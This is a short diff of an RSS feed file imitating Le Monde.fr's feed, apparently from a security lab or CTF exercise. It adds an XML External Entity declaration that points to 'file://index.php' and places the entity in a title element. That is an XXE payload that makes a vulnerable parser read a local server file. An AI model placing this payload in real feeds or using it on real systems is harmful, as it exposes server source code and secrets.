@@ -1,9 +1,10 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE rss [ <!ELEMENT title ANY >]>
+<!DOCTYPE x [ <!ELEMENT title ANY >
+<!ENTITY xxe SYSTEM 'file://index.php' >]>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
   
-	<title> &xxe;</title>
+	<title>&xxe;</title>
     <title>Le Monde.fr - Actualités et Infos en France et dans le monde</title>
     <description>Le Monde.fr - 1er site d'information. Les articles du journal et toute l'actualité en continu : International, France, Société, Economie, Culture, Environnement, Blogs ...</description>
     <copyright>Copyright Le Monde.fr</copyright>
